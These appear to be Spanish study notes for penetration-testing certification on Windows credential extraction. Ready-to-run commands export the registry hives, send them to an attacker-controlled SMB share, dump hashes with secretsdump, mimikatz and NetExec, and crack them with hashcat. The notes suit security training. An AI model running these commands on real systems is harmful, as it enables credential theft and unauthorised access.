
## 1. Hives del Registro de Windows

Cuando obtenemos privilegios administrativos en un sistema Windows, podemos extraer los hives del Registro, transferirlos a nuestra máquina atacante y analizar las credenciales **fuera de línea**, sin mantener una sesión activa con el objetivo.

Los tres hives principales son:

|Hive|Información|Utilidad|
|---|---|---|
|`HKLM\SAM`|Hashes de contraseñas de usuarios locales.|Extraer y crackear hashes locales.|
|`HKLM\SYSTEM`|Contiene información necesaria para obtener la `bootkey` del sistema.|Permite descifrar los hashes almacenados en SAM.|
|`HKLM\SECURITY`|Secretos de LSA, credenciales de dominio en caché, claves DPAPI y otros datos sensibles.|Recuperar información adicional sobre credenciales.|

**Importante:** para extraer los hashes de SAM necesitamos tanto `SAM` como `SYSTEM`. `SECURITY` es especialmente útil para recuperar otros secretos.

---

## 2. Exportar los hives con `reg.exe`

Desde una consola CMD con privilegios administrativos, guardamos copias de los hives:

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Los archivos generados son:

```
C:\sam.save
C:\system.save
C:\security.save
```

Cada comando debería devolver:

```
The operation completed successfully.
```

## 3. Transferir los archivos mediante Impacket SMB Server

Podemos utilizar `smbserver.py` de Impacket para crear un recurso compartido SMB en nuestra máquina atacante y transferir los archivos desde Windows.

### 3.1. Crear el recurso compartido

En Kali Linux:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
-smb2support CompData /home/kali/Documents/
```

**Parámetros:**

- `-smb2support`: habilita la compatibilidad con SMB2.
    
- `CompData`: nombre del recurso compartido.
    
- `/home/kali/Documents/`: directorio local donde se guardarán los archivos.
    

Sustituye la ruta por el directorio que quieras utilizar.

### 3.2. Transferir los hives desde Windows

Desde CMD en el objetivo:

```
move C:\sam.save \\10.10.15.16\CompData
move C:\system.save \\10.10.15.16\CompData
move C:\security.save \\10.10.15.16\CompData
```

Sustituye `10.10.15.16` por la IP de tu máquina atacante.

### 3.3. Verificar los archivos en Linux

```
ls -l
```

Deberíamos encontrar:

```
sam.save
system.save
security.save
```

**Alternativa:** el comando `copy` también permite copiar archivos al recurso compartido sin eliminar los originales.

## 4. Extraer hashes con `secretsdump.py`

`secretsdump.py`, de Impacket, permite analizar los hives exportados y extraer hashes y otros secretos.

### 4.1. Localizar la herramienta

```
locate secretsdump
```

### 4.2. Volcar los hashes y secretos

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
-sam sam.save \
-security security.save \
-system system.save \
LOCAL
```

La ruta de `secretsdump.py` puede variar según cómo se haya instalado Impacket.

### 4.3. Información que podemos recuperar

La herramienta puede extraer:

- Hashes LM y NT de las cuentas locales.
    
- Información de inicio de sesión de dominio en caché.
    
- Secretos de LSA.
    
- Claves DPAPI de máquina y usuario.
    
- Información relacionada con `NL$KM`.
    

La salida puede incluir líneas como:

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Esto indica que los hashes se muestran en el formato:

```
usuario:RID:LMHASH:NTHASH:::
```

### 4.4. Entender el formato

Ejemplo:

```
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

|Campo|Significado|
|---|---|
|`bob`|Nombre de usuario.|
|`1001`|RID de la cuenta.|
|Tercer campo|Hash LM.|
|Cuarto campo|Hash NT.|

La `bootkey` obtenida a partir de la información del hive `SYSTEM` permite a la herramienta procesar correctamente los hashes protegidos de SAM.

## 5. Crackear hashes NT con Hashcat

En sistemas Windows modernos, las contraseñas locales suelen almacenarse como hashes NT.

### 5.1. Crear un archivo de hashes

Podemos copiar únicamente los hashes NT obtenidos con `secretsdump.py` a un archivo:

```
nano hashestocrack.txt
```

Ejemplo de contenido:

```
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Conviene registrar qué hash corresponde a cada usuario.

### 5.2. Ejecutar Hashcat

```
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

**Parámetros:**

- `-m 1000`: modo de hash NT.
    
- `hashestocrack.txt`: archivo con los hashes.
    
- `/usr/share/wordlists/rockyou.txt`: diccionario de contraseñas.
    

Si el diccionario no está disponible, tendrás que instalarlo o utilizar otra lista.

### Modos importantes

|Tipo de hash|Modo Hashcat|
|---|---|
|NT / NTLM|`1000`|
|DCC2 / Domain Cached Credentials 2|`2100`|

**Importante:** el modo `1000` corresponde a hashes NT, mientras que el modo `2100` corresponde a hashes DCC2. No son intercambiables.

## 6. Hashes DCC2

Los hashes DCC2 representan credenciales de dominio almacenadas en caché localmente. Pueden aparecer al analizar información procedente de `HKLM\SECURITY`.

Ejemplo:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

### Características

- Se utilizan para facilitar determinados inicios de sesión de dominio cuando el controlador de dominio no está disponible.
    
- Utilizan un mecanismo basado en PBKDF2.
    
- Son considerablemente más lentos de crackear que los hashes NT.
    
- **No permiten Pass-the-Hash** como los hashes NTLM.
    

### Crackear DCC2 con Hashcat

```
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

La velocidad de recuperación depende del hardware, la configuración del hash y la contraseña. La conclusión importante es que DCC2 suele ser mucho más costoso de crackear que NTLM.

## 7. DPAPI (Data Protection API)

DPAPI es un conjunto de APIs de Windows que permite cifrar y descifrar datos protegidos asociados a usuarios o al sistema.

Algunos programas que utilizan DPAPI son:

|Aplicación|Datos que puede proteger|
|---|---|
|Google Chrome|Credenciales guardadas.|
|Internet Explorer|Datos de autocompletado y credenciales.|
|Outlook|Credenciales de correo electrónico.|
|Remote Desktop Connection|Credenciales guardadas para conexiones remotas.|
|Credential Manager|Credenciales de recursos compartidos, redes inalámbricas, VPN y otros servicios.|

Durante la extracción de secretos, podemos encontrar claves DPAPI asociadas a la máquina o al usuario.

### Herramientas relevantes

- `mimikatz`
    
- `impacket` —incluye funcionalidades relacionadas con DPAPI.
    
- `DonPAPI` —permite realizar operaciones de recuperación de secretos DPAPI de forma remota.
    

### Ejemplo con Mimikatz

El material de HTB muestra la recuperación de contraseñas almacenadas en Chrome mediante:

```
mimikatz.exe
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

El resultado puede incluir la URL, el nombre de usuario y la contraseña recuperada.

**Concepto clave:** disponer de un archivo de credenciales cifrado no implica poder descifrarlo directamente; puede ser necesario recuperar las claves y el contexto de protección DPAPI correspondientes.

## 8. Volcar secretos de LSA remotamente con NetExec

Si disponemos de credenciales con privilegios de administrador local en el objetivo, podemos utilizar NetExec para extraer secretos de LSA de forma remota a través de SMB.

```
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
```

**Parámetros:**

- `smb`: utiliza SMB.
    
- `--local-auth`: intenta autenticar con una cuenta local.
    
- `-u bob`: nombre de usuario.
    
- `-p`: contraseña.
    
- `--lsa`: solicita la extracción de secretos de LSA.
    

La salida puede incluir:

- Credenciales almacenadas por servicios.
    
- Secretos de aplicaciones o tareas.
    
- Claves DPAPI.
    
- `NL$KM`.
    
- Otros secretos disponibles en LSA.
    

El indicador `(Pwn3d!)` suele señalar que las credenciales permiten realizar operaciones administrativas sobre el objetivo.

---

## 9. Volcar SAM remotamente con NetExec

NetExec también permite extraer hashes de cuentas locales de forma remota, sin necesidad de exportar manualmente los hives.

```
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
```

**Parámetros:**

- `--local-auth`: utiliza autenticación local.
    
- `-u bob`: usuario.
    
- `-p`: contraseña.
    
- `--sam`: extrae los hashes de las cuentas locales.
    

La salida puede contener entradas con el formato:

```
usuario:RID:LMHASH:NTHASH:::
```

Los hashes NT obtenidos pueden guardarse en un archivo y probarse con Hashcat:

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Estas operaciones requieren credenciales y privilegios suficientes en el objetivo.

## 10. Resumen de comandos

### Exportar hives desde Windows

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Crear un recurso compartido SMB en Linux

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
-smb2support CompData /home/kali/Documents/
```

### Extraer hashes y secretos localmente

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
-sam sam.save -security security.save -system system.save LOCAL
```

### Crackear hashes NT

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Crackear hashes DCC2

```
hashcat -m 2100 '$DCC2$10240#usuario#HASH' /usr/share/wordlists/rockyou.txt
```

### Extraer secretos de LSA remotamente

```
netexec smb <IP> --local-auth -u <usuario> -p '<contraseña>' --lsa
```

### Extraer hashes SAM remotamente

```
netexec smb <IP> --local-auth -u <usuario> -p '<contraseña>' --sam
```

## 11. Puntos clave para CPTS/OSCP

- **SAM + SYSTEM:** combinación necesaria para extraer correctamente los hashes de cuentas locales.
    
- **SECURITY:** puede contener credenciales de dominio en caché, secretos de LSA y material relacionado con DPAPI.
    
- **secretsdump.py:** permite extraer hashes y secretos a partir de los hives exportados.
    
- **NT / NTLM:** Hashcat utiliza el modo `1000` para hashes NT.
    
- **DCC2:** Hashcat utiliza el modo `2100`; estos hashes son más lentos de crackear y no sirven para Pass-the-Hash.
    
- **DPAPI:** protege credenciales y otros datos sensibles utilizados por Windows y sus aplicaciones.
    
- **NetExec** `**--sam**`**:** extrae hashes de cuentas locales remotamente.
    
- **NetExec** `**--lsa**`**:** extrae secretos de LSA remotamente.
    
- **Trabajo fuera de línea:** permite analizar y crackear los hashes sin mantener una sesión activa en el sistema objetivo.
    
- **Reutilización de contraseñas:** las credenciales recuperadas pueden ser útiles para evaluar el acceso a otros sistemas dentro del alcance autorizado.
    

Realiza estas técnicas únicamente en laboratorios propios o sistemas para los que tengas autorización.
